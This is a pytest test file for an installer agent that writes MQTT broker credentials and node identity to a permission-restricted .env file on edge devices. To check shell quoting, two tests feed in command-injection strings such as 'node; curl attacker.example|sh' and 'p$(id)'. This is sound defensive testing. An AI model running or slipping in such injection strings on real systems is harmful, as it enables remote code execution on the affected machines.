"""Broker credentials reach an edge node out of band, and never through an argv.

The runner reads ``MQTT_USERNAME``/``MQTT_PASSWORD`` from its own environment
and exposes no flags for them, so a node deployed before broker auth existed
connects anonymously — and turning auth on orphans every one of them, retrying
forever with nothing useful in the log. Delivery is the missing half.

It has to be a file rather than the command line. ``MQTT_PASSWORD=… nohup …``
keeps the value out of the *runner's* argv, but SSH exec runs
``$SHELL -c '<the whole command string>'``, and that wrapper's argv is readable
by any local user with ``ps`` for as long as the launch takes.
"""

import shlex
from dataclasses import replace
from typing import Any

import pytest

from wactorz.agents import installer_agent
from wactorz.agents.installer_agent import InstallerAgent
from wactorz.config import CONFIG, DeployTarget


class FakeSftp:
    """Records what a deploy writes, standing in for asyncssh's SFTP client."""

    def __init__(self) -> None:
        self.written: dict[str, str] = {}
        self.modes: dict[str, int] = {}

    def open(self, path: str, _mode: str) -> Any:
        written = self.written
        outer = self

        class _Handle:
            async def write(self, body: str) -> None:
                written[path] = body

            async def __aenter__(self) -> "_Handle":
                return self

            async def __aexit__(self, *_exc: object) -> None:
                return None

        assert outer is not None
        return _Handle()

    async def chmod(self, path: str, mode: int) -> None:
        self.modes[path] = mode


def _agent() -> Any:
    agent = InstallerAgent.__new__(InstallerAgent)
    agent.name = "installer"
    return agent


def _target(**over: Any) -> DeployTarget:
    return DeployTarget(name="rpi", host="10.0.0.5", **over)


class TestWhatIsWritten:
    async def test_the_nodes_own_credentials_win(self) -> None:
        sftp = FakeSftp()
        target = _target(broker_user="rpi-account", broker_password="per-node")

        assert await _agent()._put_node_env(sftp, target, "/home/pi", "rpi", "10.0.0.1", 1883)

        body = sftp.written["/home/pi/wactorz/.env"]
        assert "MQTT_USERNAME=rpi-account" in body
        assert "MQTT_PASSWORD=per-node" in body

    async def test_it_falls_back_to_the_servers_own(self, monkeypatch: pytest.MonkeyPatch) -> None:
        # The usable default: one broker with one account is the common case.
        _server_broker(monkeypatch, "wactorz", "shared")
        sftp = FakeSftp()

        assert await _agent()._put_node_env(sftp, _target(), "/home/pi", "rpi", "10.0.0.1", 1883)

        assert "MQTT_PASSWORD=shared" in sftp.written["/home/pi/wactorz/.env"]

    async def test_it_is_written_unreadable_to_anyone_else(self) -> None:
        # The node is a Pi in a cupboard; local users are not the threat model
        # this closes, but a 0644 secret is indefensible either way.
        sftp = FakeSftp()

        await _agent()._put_node_env(
            sftp, _target(broker_password="p"), "/home/pi", "rpi", "10.0.0.1", 1883
        )

        assert sftp.modes["/home/pi/wactorz/.env"] == 0o600

    async def test_an_anonymous_broker_still_gets_a_file_but_no_credentials(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # The file carries the node's identity too, and the systemd unit reads
        # every argument from it, so it is always written. What must not appear
        # is two empty variables: exporting those is a connection failure rather
        # than a no-op, and reporting "credentials written" would be a lie.
        _server_broker(monkeypatch, "", "")
        sftp = FakeSftp()

        assert not await _agent()._put_node_env(
            sftp, _target(), "/home/pi", "rpi", "10.0.0.1", 1883
        )

        body = sftp.written["/home/pi/wactorz/.env"]
        assert "MQTT_USERNAME" not in body
        assert "MQTT_PASSWORD" not in body
        assert "WACTORZ_NODE=rpi" in body

    async def test_the_node_identity_is_written_for_the_unit(self) -> None:
        # --port has no environment fallback in the runner's parser, unlike
        # --broker and --name, so an unwritten WACTORZ_PORT expands to an empty
        # argument under the unit and argparse exits 2.
        sftp = FakeSftp()

        await _agent()._put_node_env(sftp, _target(), "/home/pi", "rpi", "10.0.0.1", 8883)

        body = sftp.written["/home/pi/wactorz/.env"]
        assert "WACTORZ_NODE=rpi" in body
        assert "WACTORZ_BROKER=10.0.0.1" in body
        assert "WACTORZ_PORT=8883" in body

    async def test_a_hostile_node_name_is_quoted_for_both_parsers(self) -> None:
        # The file is sourced by a shell on the nohup path and read as an
        # EnvironmentFile under a unit. shlex.quote is the safe intersection:
        # systemd accepts single-quoted values and does no command substitution.
        sftp = FakeSftp()

        await _agent()._put_node_env(
            sftp, _target(), "/home/pi", "node; curl attacker.example|sh", "10.0.0.1", 1883
        )

        line = next(
            ln
            for ln in sftp.written["/home/pi/wactorz/.env"].splitlines()
            if ln.startswith("WACTORZ_NODE=")
        )
        assert shlex.split(line) == ["WACTORZ_NODE=node; curl attacker.example|sh"]

    @pytest.mark.parametrize(
        "hostile",
        ["p; curl attacker.example|sh", "p$(id)", "p`id`", "p with spaces", 'p"quote'],
    )
    async def test_a_hostile_value_survives_being_sourced(self, hostile: str) -> None:
        # The file is `. `-sourced by a shell, so an unquoted value would be
        # shell syntax on the node — the injection the launch line was fixed for,
        # moved into a file.
        sftp = FakeSftp()

        await _agent()._put_node_env(
            sftp, _target(broker_password=hostile), "/home/pi", "rpi", "10.0.0.1", 1883
        )

        line = next(
            ln
            for ln in sftp.written["/home/pi/wactorz/.env"].splitlines()
            if ln.startswith("MQTT_PASSWORD=")
        )
        assert shlex.split(line) == [f"MQTT_PASSWORD={hostile}"]


class TestWhereItIsWritten:
    """The node says where its home is; nothing derives it from the user name.

    Every shell step in the deploy addresses `~`, so a home that is not
    `/home/<user>` -- root's `/root` above all -- would put the uploads and the
    unit somewhere the venv is not. That is why deploying as root never worked.
    """

    async def test_it_follows_the_resolved_home(self) -> None:
        sftp = FakeSftp()

        await _agent()._put_node_env(
            sftp, _target(broker_password="p"), "/root", "rpi", "10.0.0.1", 1883
        )

        assert "/root/wactorz/.env" in sftp.written
        assert not any(path.startswith("/home/root") for path in sftp.written)

    async def test_an_unusual_home_is_honoured_too(self) -> None:
        # LDAP and /var/lib homes are the same shape of problem as root's.
        sftp = FakeSftp()

        await _agent()._put_node_env(
            sftp, _target(broker_password="p"), "/var/lib/wactorz-node", "rpi", "10.0.0.1", 1883
        )

        assert "/var/lib/wactorz-node/wactorz/.env" in sftp.written


def _server_broker(monkeypatch: pytest.MonkeyPatch, user: str, password: str) -> None:
    """Point the agent's CONFIG at these broker credentials.

    `replace` rather than setattr: AppConfig is frozen, so the module binding is
    what a test can move.
    """
    monkeypatch.setattr(
        installer_agent,
        "CONFIG",
        replace(CONFIG, mqtt_username=user, mqtt_password=password),
    )
